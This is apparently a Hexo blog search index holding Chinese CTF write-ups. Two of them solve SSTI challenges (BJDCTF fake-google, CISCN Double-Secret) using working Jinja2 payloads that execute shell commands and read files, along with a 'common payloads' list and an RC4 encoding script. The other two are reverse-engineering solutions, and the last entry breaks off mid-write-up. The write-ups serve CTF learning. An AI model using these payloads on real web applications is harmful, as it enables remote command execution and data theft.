<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJDCTF-2nd-fake-google</title>
    <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
    <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
<ul>
<li><em>查看根目录</em></li>
</ul>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
<p>ls后台文件出现flag</p>
<ul>
<li><em>构造playload，查看flag</em></li>
</ul>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
<h1><strong>SSTI学习🇭🇺</strong></h1>
<p>像上面的题目的套路一般直接找playload注入</p>
<ul>
<li>
<h2 id="常用playload">常用playload:</h2>
</li>
</ul>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>SSTI注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019-华东南赛区-Double-Secret</title>
    <url>/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
    <content><![CDATA[<blockquote>
<p>还是太菜了</p>
</blockquote>
<h1>0X01 <strong>打开靶机地址，使用Dirsearch进行扫描查看子目录</strong></h1>
<ul>
<li><em>Dirsearch扫描网站子目录命令 🍖</em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u URL -e.php </span><br></pre></td></tr></table></figure>
<ul>
<li><em>在URL后面添加扫面的子目录，只要robots.txt有些提示，提示如下</em>(<em>然并软</em>    😓     )</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">It is Android ctf</span><br></pre></td></tr></table></figure>
<h1>0X02 <strong>使用BP进行抓包</strong></h1>
<p>没有任何线索</p>
<blockquote>
<p>想起了页面的提示 Double Secret重新构建URL</p>
</blockquote>
<h1>0X03 <strong>重新构造URL</strong></h1>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1e053da9-5f6a-4ffb-a109-4bbcaf0695d8.node3.buuoj.cn/secret</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png" alt="1"></p>
<ul>
<li><em>根据提示，我们double一下</em></li>
</ul>
<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/2.png" alt="2"></p>
<ul>
<li><em>我们发现在&quot;secret=&quot;后，后面添加不同数字就会产生不同的数值。（这个时候我们的思路大致是SQL，flask，<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>）💇</em></li>
</ul>
<h1>0X04 <strong>经过验证，无法使用php伪协议，SQL注入拿到flag，我们试一试flask（后面页面的内容也证实了我们的观点）</strong></h1>
<h2 id="1-先随便输入几个字符串"><em>1. 先随便输入几个字符串</em></h2>
<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/3.png" alt="3"></p>
<h2 id="2-代码如下-暗示得非常明显了-🐹"><em>2. 代码如下(暗示得非常明显了 🐹 )</em></h2>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">​<span class="keyword">if</span>(secret==None)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3-进行代码审计🐺"><em>3. 进行代码审计🐺</em></h2>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;</span>, line <span class="number">1799</span>, <span class="keyword">in</span> dispatch_request</span><br><span class="line"><span class="keyword">return</span> self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line">File <span class="string">&quot;/app/app.py&quot;</span>, line <span class="number">35</span>, <span class="keyword">in</span> secret</span><br><span class="line">    <span class="keyword">if</span>(secret==None): <span class="meta">#如果secret为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span> <span class="meta">#返回这句话</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#RC4解密</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<p>对我们传入的参数开始进行判断，如果参数是空，就会返回”Tell me your secret.I will encrypt it so others can’t see“这句话，如果传入参数，就会进行RC4加密。同时泄露了密钥&quot;HereIsTreasure&quot; :happy:</p>
<h2 id="4-构造一下RC4加密脚本"><em>4.构造一下RC4加密脚本</em></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="5-得到加密的字符串"><em>5.得到加密的字符串</em></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.%<span class="number">14</span>%1E%<span class="number">12</span>%C3%A484mg%C2%9C%C3%8B%<span class="number">00</span>%C2%<span class="number">81</span>%C2%8D%C2%B8%C2%<span class="number">97</span>%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%<span class="number">96</span>%3D%C2%9D%5B%C3%<span class="number">987</span>%C3%AA%<span class="number">12</span>%C2%B4%05%C2%84A%C2%BF%<span class="number">17</span>%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%<span class="number">98</span>/%<span class="number">00</span>%C2%<span class="number">90</span>%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%<span class="number">23</span>%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%<span class="number">92</span></span><br></pre></td></tr></table></figure>
<h2 id="6-在之前构建的URL后面输入加密的字符串"><em>6.在之前构建的URL后面输入加密的字符串</em></h2>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//2afce8f4-7dee-42fa-bb7a-c9eb932c319e.node3.buuoj.cn/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/4.png" alt="4"></p>
<h1><strong>拿到flag:happy:</strong></h1>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;class&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> allowed. Secret <span class="keyword">is</span> flag&#123;<span class="number">6e76</span>b7ec<span class="number">-1f</span>75<span class="number">-4686</span><span class="number">-8096</span>-bfa9f35caf9f&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/5.png" alt="5"></p>
<h1><strong>总结考点：模板注入，RC4加密，python编写脚本</strong></h1>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>FLASK</tag>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 pyre</title>
    <url>/2021/04/12/GWCTF-2019-pyre/</url>
    <content><![CDATA[<p>文件链接：<a href="https://pan.baidu.com/s/1J5GGnntQkN8IWD0hKs-X8g">https://pan.baidu.com/s/1J5GGnntQkN8IWD0hKs-X8g</a><br>
提取码：hvn1</p>
<h2 id="知识点串烧-🍖"><strong>知识点串烧 🍖</strong></h2>
<ul>
<li>.py文件：文本里面直接写python代码</li>
<li>.pyc文件： python代码转换为字节码后的文件</li>
<li><a href="https://tool.lu/pyc/">pyc代码逆向网站</a></li>
<li><a href="https://baike.baidu.com/item/%E9%81%8D%E5%8E%86">遍历</a></li>
<li><a href="https://www.runoob.com/w3cnote/bit-operation.html">位运算</a></li>
</ul>
<hr>
<h2 id="0x01-将pyc文件解密成python文件"><strong>0x01 将pyc文件解密成python文件</strong></h2>
<p><img src="/2021/04/12/GWCTF-2019-pyre/0.png" alt="0"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)        //l获得输入的长度</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):     //对每个输入进行遍历</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span>  // 有关取模，由于(a%c+b%c)%c=(a+b)%c，所以num 等价于 (input1[i] + i) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]  //前值和后值通过异或赋值给前面的一位</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="0x02-解读加密过程"><strong>0x02 解读加密过程</strong></h2>
<h3 id="第一个"><strong>第一个</strong></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>code</code>   的 <strong><code>l-1</code></strong> 位置不会修改，而且正向赋值 <strong><code>code[i]</code></strong> 不会修改 <strong><code>code[i+1]</code></strong> ,而且需要保证 <strong><code>code[i+1]</code></strong> 一直是原始值</p>
</li>
<li>
<p><strong>最简单的逆向异或式子</strong></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A ^ A &#x3D;0</span><br><span class="line">A ^ 0 &#x3D;A</span><br><span class="line">所以: A ^ A ^ B &#x3D; B</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>不难得到， <strong><code>code[i] = code[i] ^ code (i+1)</code></strong> 的正向运行结果</li>
<li>逆向的 <strong><code>code[i] = code[i] ^ code (i+1)</code></strong>  等于  <strong><code>code[i] = code[i] ^ code (i+1) ^ code (i+1) </code></strong></li>
<li>也就是 <strong><code>code[i] = code[i] ^ code (i+1)</code></strong>  。所以我们只要要倒序枚举，使用 <strong><code>code[i] = code[i] ^ code (i+1)</code></strong> 算出每一个 <strong><code>code[i]</code></strong> 原来的值</li>
</ul>
<hr>
<h3 id="第二个"><strong>第二个</strong></h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(l):</span><br><span class="line">    num &#x3D; ((input1[i] + i) % 128 + 128) % 128</span><br><span class="line">    code +&#x3D; num</span><br></pre></td></tr></table></figure>
<p>emm去模，由于(a%c+b%c)%c=(a+b)%c，所以num 等价于 (input1[i] + i) % 128</p>
<hr>
<h2 id="0x04-构造逆向反加密脚本"><strong>0x04 构造逆向反加密脚本</strong></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    code[i]=<span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i])^<span class="built_in">ord</span>(code[i+<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/12/GWCTF-2019-pyre/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>RE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>逆向反加密</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 luck_guy</title>
    <url>/2021/04/07/GXYCTF2019-luck-guy/</url>
    <content><![CDATA[<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1hoU9">https://pan.baidu.com/s/1hoU9</a>         uQsSeGr-6p7RBSm56w<br>
提取码：ed2z</p>
</blockquote>
<h2 id="0x01-查看有无加壳"><strong>0x01 查看有无加壳</strong></h2>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/1.png" alt="1"></p>
<p>没有加壳，64位文件</p>
<h2 id="0x02-打开IDA64，查看main函数，F5反编译"><strong>0x02 打开IDA64，查看main函数，F5反编译</strong></h2>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/2.png" alt="2"></p>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/3.png" alt="3"></p>
<h2 id="0x03-进入patch-me函数，接着进入get-flag函数界面">0x03 进入patch_me函数，接着进入get_flag函数界面</h2>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/4.png" alt="4"></p>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/5.png" alt="5"></p>
<h2 id="0x04-进行代码分析-😞"><strong>0x04 进行代码分析</strong> 😞</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@7</span></span><br><span class="line">  __int64 s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+18h] [bp-28h]@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);               <span class="comment">//得到时间</span></span><br><span class="line">  srand(v0);                    <span class="comment">//使用时间作为种子生成随机数字</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )      <span class="comment">// 产生1-199之间的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);      </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL); </span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);   <span class="comment">// f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);  <span class="comment">//f2初始为空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;  <span class="comment">//在IDA里面选中9180147350284624745LL按H键转换16进制为0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f    </span></span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);  <span class="comment">//f2和s拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) + (_BYTE)j) &amp; <span class="number">1</span>)</span><br><span class="line">             - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/6.png" alt="6"></p>
<p>分析可知<strong>flag</strong>是由<strong>f1</strong>和<strong>f2</strong>组成，<strong>f1</strong>已经告诉，现在只需要求<strong>f2</strong>就行。</p>
<ul>
<li>
<p>case4给<strong>f2</strong>赋值</p>
</li>
<li>
<p>case5对<strong>f2</strong>进行处理</p>
</li>
</ul>
<p>swich函数需要排序和，因此顺序是: <strong>case5&gt;case4&gt;case1</strong></p>
<h2 id="0x05-脚本构建-🍔">0x05 <strong>脚本构建</strong> 🍔</h2>
